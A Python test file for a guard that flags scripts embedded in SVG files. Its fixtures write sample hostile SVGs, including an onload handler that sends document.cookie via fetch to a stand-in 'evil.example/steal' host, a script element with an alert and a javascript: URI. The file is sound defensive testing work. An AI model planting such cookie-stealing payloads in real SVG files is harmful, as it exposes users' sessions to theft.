"""Tests for the svg-embedded-script guard.

Covers:
  - svg-embedded-script/script-element (HIGH)
  - svg-embedded-script/event-handler-attribute (HIGH)
  - svg-embedded-script/javascript-uri (HIGH)
"""
from __future__ import annotations

from agentsec.guards.svg_embedded_script import SvgEmbeddedScriptGuard
from tests.guards._common import *  # noqa: F401,F403


def test_fires_on_script_element(tmp_path: Path) -> None:
    (tmp_path / "logo.svg").write_text(
        '<svg xmlns="http://www.w3.org/2000/svg">\n'
        "<script>alert(document.cookie)</script>\n"
        "</svg>\n",
        encoding="utf-8",
    )
    findings = SvgEmbeddedScriptGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "svg-embedded-script/script-element" for f in findings)
    assert all(f.severity == "high" for f in findings)


def test_fires_on_event_handler_attribute(tmp_path: Path) -> None:
    (tmp_path / "icon.svg").write_text(
        '<svg onload="fetch(\'https://evil.example/steal?c=\'+document.cookie)">\n'
        "<circle cx='5' cy='5' r='4'/>\n"
        "</svg>\n",
        encoding="utf-8",
    )
    findings = SvgEmbeddedScriptGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "svg-embedded-script/event-handler-attribute" for f in findings)


def test_fires_on_javascript_uri(tmp_path: Path) -> None:
    (tmp_path / "link.svg").write_text(
        '<svg xmlns="http://www.w3.org/2000/svg">\n'
        '<a xlink:href="javascript:alert(1)"><text>click</text></a>\n'
        "</svg>\n",
        encoding="utf-8",
    )
    findings = SvgEmbeddedScriptGuard().run(tmp_path, mkprofile(tmp_path, features=set()))
    assert any(f.rule == "svg-embedded-script/javascript-uri" for f in findings)


def test_passes_plain_svg(tmp_path: Path) -> None:
    (tmp_path / "plain.svg").write_text(
        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10">\n'
        '<circle cx="5" cy="5" r="4" fill="blue"/>\n'
        "</svg>\n",
        encoding="utf-8",
    )
    assert SvgEmbeddedScriptGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_passes_non_svg_file(tmp_path: Path) -> None:
    (tmp_path / "notes.txt").write_text("<script>alert(1)</script>\n", encoding="utf-8")
    assert SvgEmbeddedScriptGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_pragma_opt_out(tmp_path: Path) -> None:
    (tmp_path / "trusted.svg").write_text(
        "<!-- security: allow-svg-embedded-script -->\n"
        '<svg onload="init()">\n'
        "<script>init()</script>\n"
        "</svg>\n",
        encoding="utf-8",
    )
    assert SvgEmbeddedScriptGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []


def test_passes_href_without_javascript_scheme(tmp_path: Path) -> None:
    (tmp_path / "safe_link.svg").write_text(
        '<svg xmlns="http://www.w3.org/2000/svg">\n'
        '<a xlink:href="https://example.com"><text>click</text></a>\n'
        "</svg>\n",
        encoding="utf-8",
    )
    assert SvgEmbeddedScriptGuard().run(tmp_path, mkprofile(tmp_path, features=set())) == []
